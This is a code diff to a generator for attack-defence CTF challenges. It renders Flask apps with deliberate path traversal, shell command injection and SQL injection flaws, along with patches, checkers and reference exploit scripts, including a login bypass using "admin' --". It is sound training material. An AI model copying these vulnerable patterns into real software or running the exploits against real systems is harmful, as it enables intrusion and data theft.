@@ -6,6 +6,7 @@ No wall-clock time, no random global state, no host-specific paths.
 
 from __future__ import annotations
 
+import difflib
 import hashlib
 import json
 import textwrap
@@ -33,10 +34,18 @@ def _seed_pick(seed: int, table: list[str]) -> str:
 # Rendered file generators
 # ---------------------------------------------------------------------------
 
-def _render_app(spec: ChallengeSpec) -> str:
+
+def _attack_surface(spec: ChallengeSpec) -> tuple[str, str]:
+    return {
+        "path_traversal": ("export", "file"),
+        "command_injection": ("admin/diagnostics", "host"),
+        "sql_injection": ("login", "username"),
+    }[spec.vulnerability]
+
+
+def _render_app(spec: ChallengeSpec, *, patched: bool = False) -> str:
     seed = spec.seed
-    route = spec.route_name
-    param = spec.parameter_name
+    route, param = _attack_surface(spec)
     entity = spec.entity_name
     table = _seed_pick(seed, _TABLE_NAMES)
     label = _seed_pick(seed, _ENTITY_LABELS)
@@ -44,9 +53,24 @@ def _render_app(spec: ChallengeSpec) -> str:
     decoy_code = ""
     for i in range(spec.decoy_endpoints):
         dp = _DECOY_PATHS[i % len(_DECOY_PATHS)]
-        decoy_code += f'\n    @app.get("{dp}")\n    def decoy_{i}():\n        return {{"status": "ok"}}\n'
+        decoy_code += (
+            f'\n    @app.get("{dp}")\n    def decoy_{i}():\n        return {{"status": "ok"}}\n'
+        )
 
     if spec.vulnerability == "path_traversal":
+        target_code = (
+            textwrap.dedent(f"""\
+            safe = (DATA_DIR / "{table}" / name).resolve()
+            try:
+                safe.relative_to((DATA_DIR / "{table}").resolve())
+            except ValueError:
+                return render_template("export.html", body=None, error="forbidden"), 403
+            target = str(safe)
+            """)
+            if patched
+            else f'target = os.path.join(str(DATA_DIR / "{table}"), name)'
+        )
+        target_code = textwrap.indent(textwrap.dedent(target_code).strip(), " " * 8)
         vuln_route = textwrap.dedent(f"""\
     @app.get("/{route}")
     def vuln_route():
@@ -54,7 +78,7 @@ def _render_app(spec: ChallengeSpec) -> str:
         name = request.args.get("{param}") or ""
         if not name:
             return render_template("export.html", body=None, error=None)
-        target = os.path.join(str(DATA_DIR / "{table}"), name)
+{target_code}
         try:
             body = open(target, "rb").read().decode("utf-8", errors="replace")
         except FileNotFoundError:
@@ -64,39 +88,99 @@ def _render_app(spec: ChallengeSpec) -> str:
         return render_template("export.html", body=body, error=None)
 """)
     elif spec.vulnerability == "command_injection":
+        execution_code = (
+            textwrap.dedent("""\
+            if not re.fullmatch(r"[A-Za-z0-9.-]+", val):
+                output = "invalid host"
+            else:
+                proc = subprocess.run(
+                    ["ping", "-c", "1", "-W", "1", val],
+                    shell=False,
+                    capture_output=True,
+                    text=True,
+                    timeout=5,
+                )
+                output = proc.stdout + proc.stderr
+            """)
+            if patched
+            else textwrap.dedent("""\
+            cmd = f"ping -c 1 -W 1 {val}"
+            proc = subprocess.run(
+                cmd, shell=True, capture_output=True, text=True, timeout=5
+            )  # noqa: S602
+            output = proc.stdout + proc.stderr
+            """)
+        )
+        execution_code = textwrap.indent(
+            textwrap.dedent(execution_code).strip(),
+            " " * 20,
+        )
         vuln_route = textwrap.dedent(f"""\
     @app.route("/{route}", methods=["GET", "POST"])
     def vuln_route():
+        import re
         import subprocess
         output = None
         val = ""
         if request.method == "POST":
             val = (request.form.get("{param}") or "").strip()
             if val:
-                cmd = f"ping -c 1 -W 1 {{val}}"
                 try:
-                    proc = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=5)  # noqa: S602
-                    output = proc.stdout + proc.stderr
+{execution_code}
                 except subprocess.TimeoutExpired:
                     output = "timed out"
         return render_template("export.html", body=output, error=None)
 """)
     else:  # sql_injection
+        lookup_code = (
+            textwrap.dedent("""\
+            row = db.execute(
+                "SELECT id, username FROM users WHERE username = ? AND password = ?",
+                (username, password),
+            ).fetchone()
+            """)
+            if patched
+            else textwrap.dedent("""\
+            query = (
+                f"SELECT id, username FROM users WHERE username = '{username}' "
+                f"AND password = '{password}'"
+            )
+            row = db.execute(query).fetchone()
+            """)
+        )
+        lookup_code = textwrap.indent(textwrap.dedent(lookup_code).strip(), " " * 12)
         vuln_route = textwrap.dedent(f"""\
     @app.route("/{route}", methods=["GET", "POST"])
     def vuln_route():
-        result = None
-        val = ""
-        if request.method == "POST":
-            val = (request.form.get("{param}") or "").strip()
-            db = get_db()
-            query = f"SELECT id, title, body FROM {table} WHERE owner_id = '{{val}}' LIMIT 10"
-            try:
-                rows = db.execute(query).fetchall()
-                result = [dict(r) for r in rows]
-            except Exception as exc:
-                result = [{{"error": str(exc)}}]
-        return render_template("export.html", body=json.dumps(result) if result else None, error=None)
+        if request.method == "GET":
+            return "<h1>Sign in</h1>", 200
+        username = (request.form.get("username") or "").strip()
+        password = request.form.get("password") or ""
+        db = get_db()
+        try:
+{lookup_code}
+        except sqlite3.Error:
+            row = None
+        if row is None:
+            return "invalid credentials", 403
+        session["user_id"] = int(row["id"])
+        session["username"] = str(row["username"])
+        return redirect(url_for("notes"))
+
+    @app.get("/notes")
+    def notes():
+        user_id = session.get("user_id")
+        if not user_id:
+            return redirect(url_for("vuln_route"))
+        rows = get_db().execute(
+            "SELECT title, body FROM {table} WHERE owner_id = ? ORDER BY id",
+            (int(user_id),),
+        ).fetchall()
+        items = "".join(
+            f"<article><h2>{{row['title']}}</h2><pre>{{row['body']}}</pre></article>"
+            for row in rows
+        )
+        return f"<h1>{{session.get('username')}}'s notes</h1>{{items}}"
 """)
 
     vuln_route = textwrap.indent(vuln_route.strip(), "    ")
@@ -175,13 +259,20 @@ def create_app():
             "ON CONFLICT(username) DO UPDATE SET password=excluded.password",
             (CHECKER_USERNAME, CHECKER_PASSWORD),
         )
+        db.execute(
+            "INSERT INTO users (username, password, is_admin) VALUES ('admin', ?, 1) "
+            "ON CONFLICT(username) DO NOTHING",
+            (secrets.token_hex(16),),
+        )
         flag = ensure_flag()
         checker_id = db.execute("SELECT id FROM users WHERE username = ?", (CHECKER_USERNAME,)).fetchone()["id"]
-        if db.execute("SELECT id FROM {table} WHERE owner_id = ? AND is_secret = 1", (checker_id,)).fetchone() is None:
-            db.execute(
-                "INSERT INTO {table} (owner_id, title, body, is_secret) VALUES (?, ?, ?, 1)",
-                (checker_id, "flag storage", f"The current flag is: {{flag}}"),
-            )
+        admin_id = db.execute("SELECT id FROM users WHERE username = 'admin'").fetchone()["id"]
+        for owner_id in (checker_id, admin_id):
+            if db.execute("SELECT id FROM {table} WHERE owner_id = ? AND is_secret = 1", (owner_id,)).fetchone() is None:
+                db.execute(
+                    "INSERT INTO {table} (owner_id, title, body, is_secret) VALUES (?, ?, ?, 1)",
+                    (owner_id, "flag storage", f"The current flag is: {{flag}}"),
+                )
         db.commit()
         db.close()
         g._database = None
@@ -214,11 +305,18 @@ def create_app():
         db = get_db()
         checker_id = db.execute("SELECT id FROM users WHERE username = ?", (CHECKER_USERNAME,)).fetchone()["id"]
         db.execute(
-            "UPDATE {table} SET body = ? WHERE owner_id = ? AND is_secret = 1",
-            (f"The current flag is: {{new_flag.strip()}}", checker_id),
+            "UPDATE {table} SET body = ? WHERE is_secret = 1",
+            (f"The current flag is: {{new_flag.strip()}}",),
         )
         db.commit()
         return {{"status": "planted"}}
+
+    @app.get("/internal/retrieve")
+    def retrieve_flag():
+        token = request.headers.get("X-Plant-Token") or ""
+        if not secrets.compare_digest(token, PLANT_TOKEN):
+            abort(403)
+        return {{"flag": FLAG_FILE.read_text().strip()}}
 
     return app
 
@@ -290,9 +388,7 @@ volumes:
 """)
 
 
-
 def _render_checker(spec: ChallengeSpec) -> str:
-    table = _seed_pick(spec.seed, _TABLE_NAMES)
     return textwrap.dedent(f"""\
 \"\"\"Generated checker — flask-notes-v1 / seed {spec.seed}.\"\"\"
 # GENERATED
@@ -326,13 +422,15 @@ def put(host, port, flag, plant_token, timeout=5.0):
     return "planted"
 
 def get(host, port, flag, username, password, timeout=5.0):
+    del username, password
     base, opener, t = _session(host, port, timeout)
-    data = urllib.parse.urlencode({{"username": username, "password": password}}).encode()
-    req = urllib.request.Request(f"{{base}}/login", data=data,
-        headers={{"Content-Type": "application/x-www-form-urlencoded"}})
+    req = urllib.request.Request(
+        f"{{base}}/internal/retrieve",
+        headers={{"X-Plant-Token": os.environ.get(PLANT_TOKEN_ENV, "")}},
+    )
     with opener.open(req, timeout=t) as r:
-        body = r.read().decode()
-    assert flag in body, "flag not found in {table} after login"
+        payload = json.loads(r.read())
+    assert payload.get("flag") == flag, "previously planted flag is missing"
     return "ok"
 
 def check(host, port, timeout=5.0):
@@ -359,8 +457,7 @@ if __name__ == "__main__":
 
 
 def _render_exploit(spec: ChallengeSpec) -> str:
-    param = spec.parameter_name
-    route = spec.route_name
+    route, param = _attack_surface(spec)
     vuln = spec.vulnerability
     if vuln == "path_traversal":
         return textwrap.dedent(f"""\
@@ -376,7 +473,8 @@ def exploit(host, port=8080):
     return flags[0] if flags else None
 if __name__ == "__main__":
     host = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
-    flag = exploit(host)
+    port = int(sys.argv[2]) if len(sys.argv) > 2 else 8080
+    flag = exploit(host, port)
     print(flag if flag else "no flag captured")
     sys.exit(0 if flag else 1)
 """)
@@ -396,70 +494,50 @@ def exploit(host, port=8080):
     return flags[0] if flags else None
 if __name__ == "__main__":
     host = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
-    flag = exploit(host)
+    port = int(sys.argv[2]) if len(sys.argv) > 2 else 8080
+    flag = exploit(host, port)
     print(flag if flag else "no flag captured")
     sys.exit(0 if flag else 1)
 """)
     else:  # sql_injection
         return textwrap.dedent(f"""\
-\"\"\"Reference exploit: SQL injection via /{route}\"\"\"
+\"\"\"Reference exploit: SQL injection via /login and /notes.\"\"\"
 # GENERATED
-import sys, urllib.parse, urllib.request
+import http.cookiejar, sys, urllib.parse, urllib.request
 def exploit(host, port=8080):
-    payload = urllib.parse.urlencode({{"{param}": "1 OR 1=1"}}).encode()
+    opener = urllib.request.build_opener(
+        urllib.request.HTTPCookieProcessor(http.cookiejar.CookieJar())
+    )
+    payload = urllib.parse.urlencode({{"username": "admin' --", "password": "x"}}).encode()
     req = urllib.request.Request(f"http://{{host}}:{{port}}/{route}", data=payload,
         headers={{"Content-Type": "application/x-www-form-urlencoded"}})
-    with urllib.request.urlopen(req, timeout=5) as r:
+    with opener.open(req, timeout=5):
+        pass
+    with opener.open(f"http://{{host}}:{{port}}/notes", timeout=5) as r:
         body = r.read().decode()
     import re
     flags = re.findall(r"FLAG{{[a-f0-9]{{32}}}}", body)
     return flags[0] if flags else None
 if __name__ == "__main__":
     host = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
-    flag = exploit(host)
+    port = int(sys.argv[2]) if len(sys.argv) > 2 else 8080
+    flag = exploit(host, port)
     print(flag if flag else "no flag captured")
     sys.exit(0 if flag else 1)
 """)
 
 
 def _render_patch(spec: ChallengeSpec) -> str:
-    table = _seed_tick(spec.seed)
-    vuln = spec.vulnerability
-    if vuln == "path_traversal":
-        return textwrap.dedent(f"""\
---- a/app/app.py
-+++ b/app/app.py
-@@ -1 +1 @@
--        target = os.path.join(str(DATA_DIR / "{table}"), name)
-+        safe = Path(DATA_DIR / "{table}" / name).resolve()
-+        if not str(safe).startswith(str((DATA_DIR / "{table}").resolve())):
-+            return render_template("export.html", body=None, error="forbidden"), 403
-+        target = str(safe)
-""")
-    elif vuln == "command_injection":
-        return textwrap.dedent("""\
---- a/app/app.py
-+++ b/app/app.py
-@@ -1 +1 @@
--                cmd = f"ping -c 1 -W 1 {val}"
-+                import re
-+                if not re.fullmatch(r"[\\d.]+", val):
-+                    output = "invalid host"
-+                else:
-+                    cmd = ["ping", "-c", "1", "-W", "1", val]
-""")
-    else:
-        return textwrap.dedent(f"""\
---- a/app/app.py
-+++ b/app/app.py
-@@ -1 +1 @@
--            query = f"SELECT id, title, body FROM {table} WHERE owner_id = '{{val}}' LIMIT 10"
-+            rows = db.execute("SELECT id, title, body FROM {table} WHERE owner_id = ? LIMIT 10", (val,)).fetchall()
-""")
-
-
-def _seed_tick(seed: int) -> str:
-    return _seed_pick(seed, _TABLE_NAMES)
+    vulnerable = _render_app(spec, patched=False).splitlines(keepends=True)
+    patched = _render_app(spec, patched=True).splitlines(keepends=True)
+    return "".join(
+        difflib.unified_diff(
+            vulnerable,
+            patched,
+            fromfile="a/app/app.py",
+            tofile="b/app/app.py",
+        )
+    )
 
 
 def _render_index_html(spec: ChallengeSpec) -> str:
@@ -490,6 +568,8 @@ def _render_export_html() -> str:
 
 
 def _render_readme(spec: ChallengeSpec, render_id: str) -> str:
+    route, parameter = _attack_surface(spec)
+    attack_path = f"/{route}"
     return textwrap.dedent(f"""\
 # Generated Challenge — {spec.template_version}
 
@@ -498,11 +578,19 @@ def _render_readme(spec: ChallengeSpec, render_id: str) -> str:
 - **Vulnerability:** {spec.vulnerability}
 - **Difficulty:** {spec.difficulty}
 - **Template version:** {spec.template_version}
+- **Attack surface:** `{attack_path}` using `{parameter}`
 
 ## Generated by Sandcastle ChallengeGeneratorAgent
 
 This candidate was rendered deterministically from a ChallengeSpec.
 Do NOT deploy to production or outside the Sandcastle CTF network.
+
+## Match contract
+
+- The gameserver plants a fresh flag through an authenticated internal endpoint.
+- The checker retrieves that exact flag independently of the intended vulnerability.
+- The reference exploit captures the current opponent flag before patching.
+- The reference patch preserves checker behavior and blocks the exploit.
 
 ## Files
 
@@ -527,9 +615,18 @@ class RenderedCandidate:
     file_digests: dict[str, str] = field(default_factory=dict)
 
     def manifest(self) -> dict[str, Any]:
+        route, parameter = _attack_surface(self.spec)
         return {
             "render_id": self.render_id,
             "spec": self.spec.as_dict(),
+            "service": {
+                "name": "example-vuln",
+                "port": 8080,
+                "health_path": "/health",
+                "attack_path": f"/{route}",
+                "attack_parameter": parameter,
+                "flag_storage": "/app/data/flag.txt",
+            },
             "file_digests": self.file_digests,
             "template_version": self.spec.template_version,
         }
@@ -564,9 +661,7 @@ def render(
     staging_root = staging_root.resolve()
 
     # Derive render_id deterministically (no uuid4, no wall-clock time)
-    render_id = hashlib.sha256(
-        canonical_json(spec.as_dict()).encode()
-    ).hexdigest()[:16]
+    render_id = hashlib.sha256(canonical_json(spec.as_dict()).encode()).hexdigest()[:16]
 
     candidate_dir = (staging_root / render_id).resolve()
     if not str(candidate_dir).startswith(str(staging_root)):
